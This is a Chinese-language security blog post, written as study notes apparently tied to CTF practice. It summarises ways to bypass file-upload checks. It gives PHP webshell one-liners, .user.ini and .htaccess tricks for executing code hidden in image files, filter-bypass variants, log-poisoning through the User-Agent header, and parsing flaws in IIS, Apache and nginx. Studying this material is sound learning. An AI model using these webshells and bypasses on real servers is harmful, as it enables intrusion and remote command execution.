@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="isyang_" />
+
+
+
+<meta name="description" content="有关文件上传的一点小学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传总结">
+<meta property="og:url" content="https://isyang666.github.io/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="isyang_&#39;s blog">
+<meta property="og:description" content="有关文件上传的一点小学习">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-21T09:30:54.000Z">
+<meta property="article:modified_time" content="2024-03-21T09:30:54.000Z">
+<meta property="article:author" content="isyang_">
+<meta property="article:tag" content="upload">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="isyang_&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>文件上传总结 | isyang_&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/头像.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa CSDN" target="_blank" rel="noopener" href="https://blog.csdn.net/weiyang6" title="CSDN"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/" rel="tag">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTFD/" rel="tag">CTFD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Go/" rel="tag">Go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vs2022/" rel="tag">Vs2022</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arp/" rel="tag">arp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hello/" rel="tag">hello</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/html/" rel="tag">html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python3/" rel="tag">python3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload/" rel="tag">upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="tag">信息搜集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%8A%9F%E8%83%BD/" rel="tag">小功能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8E%92%E5%BA%8F/" rel="tag">排序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一个刚刚入门安全领域的萌新</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/头像.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/weiyang6" title="CSDN"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-文件上传总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" class="article-date">
+      <time datetime="2024-03-21T09:30:54.000Z" itemprop="datePublished">2024-03-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件上传总结
+    </h1>
+  
+
+        <!-- 开始添加字数统计-->
+        
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/upload/" rel="tag">upload</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>后门代码必须用特定格式后缀解析,不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如: jpg图片里面有php后门代码,后门不能被解析,所以连接不上</p>
+<p>webshell和其对应网站的开发语言:</p>
+<ul>
+<li>php      php马</li>
+<li>asp      asp马 </li>
+<li>.net     aspx马</li>
+<li>java     jsp马</li>
+</ul>
+<h2 id="文件上传的检测-ctfshow"><a href="#文件上传的检测-ctfshow" class="headerlink" title="文件上传的检测(ctfshow)"></a>文件上传的检测(ctfshow)</h2><p>分为前端检测和后端检测 白名单策略和黑名单策略</p>
+<h3 id="前端检测-前端代码可改-在本地删掉或者更改前端代码即可"><a href="#前端检测-前端代码可改-在本地删掉或者更改前端代码即可" class="headerlink" title="前端检测(前端代码可改,在本地删掉或者更改前端代码即可)"></a>前端检测(前端代码可改,在本地删掉或者更改前端代码即可)</h3><ul>
+<li>检查文件后缀</li>
+</ul>
+<h3 id="后端检测-后端检查代码未知-只能去猜-可能是黑名单验证或者白名单验证"><a href="#后端检测-后端检查代码未知-只能去猜-可能是黑名单验证或者白名单验证" class="headerlink" title="后端检测(后端检查代码未知,只能去猜,可能是黑名单验证或者白名单验证)"></a>后端检测(后端检查代码未知,只能去猜,可能是黑名单验证或者白名单验证)</h3><h4 id="上传检测"><a href="#上传检测" class="headerlink" title="上传检测"></a>上传检测</h4><ul>
+<li><p>文件后缀验证: 检查上传文件的后缀名是否合法</p>
+<ol>
+<li>可以通过可以试一下大小写绕过(windows),多后缀解析(上传php5,php7)</li>
+<li>配置文件利用(<code>.user.ini</code>文件(nginx,apache)  <code>.htaccess</code>文件(apache,nginx默认不支持但是可以通过其他配置支持))  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.user.ini作用</span><br><span class="line">1. 防止跨目录访问和文件跨目录读取：.user.ini文件可以帮助防止非法用户访问或读取目录中的文件(只对此目录和子目录的php程序起作用)</span><br><span class="line">2. 文件包含：.user.ini文件中的auto_prepend_file和auto_append_file配置可以实现文件包含。auto_prepend_file配置项指定一个文件，该文件会在每个PHP脚本执行前被自动包含，类似于在文件前调用了require()函数。而auto_append_file配置项指定的文件会在每个PHP脚本执行后被自动包含</span><br><span class="line">3. 使用的条件:服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)</span><br><span class="line">总结一下:</span><br><span class="line">利用.user.ini文件需要同目录下 有以下三个文件</span><br><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg // 包含图片</span><br><span class="line">// 1.jpg</span><br><span class="line">&lt;?php eval(`$_GET[&#x27;cmd&#x27;]);?&gt;        // 后门代码</span><br><span class="line">// index.php(任意php文件,用来执行.user.ini)      </span><br></pre></td></tr></table></figure></li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.htaccess作用</span><br><span class="line">    网站的配置文件 和.user.ini类似 可以通过更改解析规则来实现解析文件马</span><br><span class="line">利用:</span><br><span class="line">    先传入图片马</span><br><span class="line">    然后传入.htaccess文件,文件内容如下</span><br><span class="line">    AddType application/x-httpd-php .png</span><br><span class="line">    意思是将.png文件解析为php文件(.png可以替换为别的文件名)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MIME类型验证: 在数据包的Content-Type字段中检查上传文件的类型</p>
+</li>
+<li><p>图片内容检测: 检查数据包中的图片内容是否合法,可以在数据包中慢慢删除一些数据,去测试检测点(然后再去看如何绕过)</p>
+<ol>
+<li><p>检查标签(比如检测&lt;?php ): 可以用短标签或者其他标签去绕过</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ?&gt;       // 需要开启短标签开关 short_open_tag</span><br><span class="line"></span><br><span class="line">&lt;?=         // 不需要闭合标签 要求：PHP版本&gt;PHP 5.4.0</span><br><span class="line"></span><br><span class="line">// asp标签</span><br><span class="line">&lt;%  %&gt;      //  要求开启asp_tags</span><br><span class="line"></span><br><span class="line">// js标签 php7后好像就不能用了</span><br><span class="line">&lt;script language=”php”&gt;system($_GET[&#x27;cmd&#x27;]); </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>文件头检验: 添加图片文件头绕过(一般用gif文件头GIF89a来绕过)</p>
+</li>
+<li><p>检查<code>[]</code>: 可以用()去绕过 如 <code>&lt;?php eval($_GET(&#39;cmd&#39;));?&gt;</code></p>
+</li>
+<li><p>检查<code>;</code>: 可以不写分号去绕过 如 <code>&lt;?=system(&#39;tac  ../fl*&#39;)?&gt;</code>   </p>
+</li>
+<li><p>检查<code>()</code>: 可以用反引号去绕过 如 <code>&lt;?=`tac ../f*`?&gt;</code></p>
+</li>
+<li><p>检查<code>.</code>: 可以用远程文件包含(<code>.user.ini</code>或者 <code>图片马</code>)去绕过,包含vps中的后门代码 IP 地址中的<code>.</code> 可以用ip转int类型去绕过 如 <code>&lt;?php include &#39;2130706433&#39;?&gt;</code></p>
+</li>
+<li><p>一些关键字被过滤了,可以用”.”去拼接 如log被过滤 可以用 lo”.”g去绕过</p>
+</li>
+<li><p>在所有的在请求体里面的绕过都无效的时候,可以试试尝试将payload写入UA头里面,因为服务器会有日志记录,所有我们可以将payload写入UA头里面,然后再通过.user.ini去包含图片马(图片马中要包含日志文件)来执行,如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">随便发送一个包UA头里面带payload</span><br><span class="line"></span><br><span class="line">// 图片马包含日志</span><br><span class="line">// nginx日志路径为:/var/log/nginx/access.log </span><br><span class="line">// apache日志路径为:/var/log/httpd/access_log</span><br><span class="line">&lt;?php include &quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br><span class="line">// &quot;&quot;和. 来拼接绕过log关键字</span><br><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg // 包含图片</span><br><span class="line"></span><br><span class="line">然后再访问该目录(会直接到该目录的php文件去执行)</span><br><span class="line">然后看到的就是日志文件了</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+<h4 id="上传后检测"><a href="#上传后检测" class="headerlink" title="上传后检测"></a>上传后检测</h4><ol>
+<li>上传成功后检测文件,将文件删除<ul>
+<li>什么都删除: 可以试试条件竞争(在上传成功的时候,立马访问,创建新后门)</li>
+<li>检测到恶意文件删除: 免杀 条件竞争</li>
+</ul>
+</li>
+<li>上传的文件更改(二次渲染)<ul>
+<li>上传图片马 发现名字和之前上传之前的不一样 然后大小,尺寸属性也不一样 但是图片内容(二进制数据)有相似的地方<br>   此时需要用脚本生成特定的图片马,或者将恶意代码嵌入到相同图片内容的地方中间</li>
+</ul>
+<p>  <code>https://blog.csdn.net/qq_40800734/article/details/105920149</code></p>
+</li>
+</ol>
+<h2 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h2><h3 id="IIS-version-x3D-6-0-通常为winserver-2003-7-0和7-5-通常为winserver-2008"><a href="#IIS-version-x3D-6-0-通常为winserver-2003-7-0和7-5-通常为winserver-2008" class="headerlink" title="IIS(version&#x3D;6.0(通常为winserver 2003),7.0和7.5(通常为winserver 2008))"></a>IIS(version&#x3D;6.0(通常为winserver 2003),7.0和7.5(通常为winserver 2008))</h3><ul>
+<li>IIS6.0<ol>
+<li>文件名: x.asp;x.jpg 就会将jpg解析成asp文件</li>
+<li>目录名: x.asp&#x2F;x.jpg 就会将jpg解析成asp文件(这个需要更改webshell的上一级的目录名)</li>
+</ol>
+</li>
+<li>Apache HTTPD 换行解析漏洞 apache(2.4.0~2.4.29)<ol>
+<li><code>黑名单绕过</code>,如果是白名单策略可能不行: 如果开发者不以最后一个点为准去写白名单 <code>x.jpg.php%0A</code> 则可以绕过</li>
+<li>在上传的时候更改<code>hex</code>(在php后缀后面加上<code>x0A</code>)实现绕过,然后访问<code>x.php%0A</code>就可以成功使服务器将<code>php%0A</code>文件执行为<code>php</code></li>
+</ol>
+</li>
+<li>nginx<br>漏洞1:用户配置不当造成的解析漏洞<br>上传图片马后访问 然后在地址后面加上&#x2F;.php 即可成功执行php<br>漏洞2.文件名的逻辑漏洞(Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7)<br>上传图片马<code>1.gif </code> (注意gif后面的空格),后访问<code>http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php</code> 即可发现php已经被执行</li>
+<li>IIS 7.0&#x2F;IIS 7.5<br>它的解析漏洞和nginx的漏洞1一样</li>
+</ul>
+<h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><p>  看编辑器的类型和版本,然后去搜漏洞利用</p>
+<h1 id="文件上传的黑盒和白盒"><a href="#文件上传的黑盒和白盒" class="headerlink" title="文件上传的黑盒和白盒"></a>文件上传的黑盒和白盒</h1><h2 id="黑盒-寻找一切存在文件上传的功能和应用"><a href="#黑盒-寻找一切存在文件上传的功能和应用" class="headerlink" title="黑盒: 寻找一切存在文件上传的功能和应用"></a>黑盒: 寻找一切存在文件上传的功能和应用</h2><ol>
+<li>个人用户中心是否存在文件上传功能</li>
+<li>后台管理系统是否存在文件上传功能</li>
+<li>字典目录扫描探针文件上传构造地址</li>
+<li>字典目录扫描探针编辑器目录构造地址</li>
+</ol>
+<h2 id="白盒-看三点-中间件-编辑器-功能代码"><a href="#白盒-看三点-中间件-编辑器-功能代码" class="headerlink" title="白盒: 看三点 中间件 编辑器 功能代码"></a>白盒: 看三点 中间件 编辑器 功能代码</h2><ol>
+<li>中间件直接看语言环境常用搭配</li>
+<li>编辑器直接看目录结构或搜索关键字</li>
+<li>功能代码直接看源码应用或搜索关键字</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">文件上传总结</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
+        <p><span>Created:</span>2024-03-21, 17:30:54</p>
+        <p><span>Updated:</span>2024-03-21, 17:30:54</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" title="文件上传总结">https://isyang666.github.io/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a>
+            <span class="copy-path" data-clipboard-text="From https://isyang666.github.io/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2024/03/21/XSS%E8%B7%A8%E7%AB%99%E6%80%BB%E7%BB%93/">
+                    XSS跨站总结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2024/02/25/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/">
+                    学习通登录JS逆向
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%A3%80%E6%B5%8B-ctfshow"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传的检测(ctfshow)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E6%A3%80%E6%B5%8B-%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%8F%AF%E6%94%B9-%E5%9C%A8%E6%9C%AC%E5%9C%B0%E5%88%A0%E6%8E%89%E6%88%96%E8%80%85%E6%9B%B4%E6%94%B9%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%8D%B3%E5%8F%AF"><span class="toc-number">1.1.1.</span> <span class="toc-text">前端检测(前端代码可改,在本地删掉或者更改前端代码即可)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E6%A3%80%E6%B5%8B-%E5%90%8E%E7%AB%AF%E6%A3%80%E6%9F%A5%E4%BB%A3%E7%A0%81%E6%9C%AA%E7%9F%A5-%E5%8F%AA%E8%83%BD%E5%8E%BB%E7%8C%9C-%E5%8F%AF%E8%83%BD%E6%98%AF%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E6%88%96%E8%80%85%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81"><span class="toc-number">1.1.2.</span> <span class="toc-text">后端检测(后端检查代码未知,只能去猜,可能是黑名单验证或者白名单验证)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">上传检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%90%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">上传后检测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">中间件解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-version-x3D-6-0-%E9%80%9A%E5%B8%B8%E4%B8%BAwinserver-2003-7-0%E5%92%8C7-5-%E9%80%9A%E5%B8%B8%E4%B8%BAwinserver-2008"><span class="toc-number">1.2.1.</span> <span class="toc-text">IIS(version&#x3D;6.0(通常为winserver 2003),7.0和7.5(通常为winserver 2008))</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">编辑器漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E9%BB%91%E7%9B%92%E5%92%8C%E7%99%BD%E7%9B%92"><span class="toc-number">2.</span> <span class="toc-text">文件上传的黑盒和白盒</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92-%E5%AF%BB%E6%89%BE%E4%B8%80%E5%88%87%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%8A%9F%E8%83%BD%E5%92%8C%E5%BA%94%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">黑盒: 寻找一切存在文件上传的功能和应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92-%E7%9C%8B%E4%B8%89%E7%82%B9-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%BC%96%E8%BE%91%E5%99%A8-%E5%8A%9F%E8%83%BD%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">白盒: 看三点 中间件 编辑器 功能代码</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"文件上传总结　| isyang_'s blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
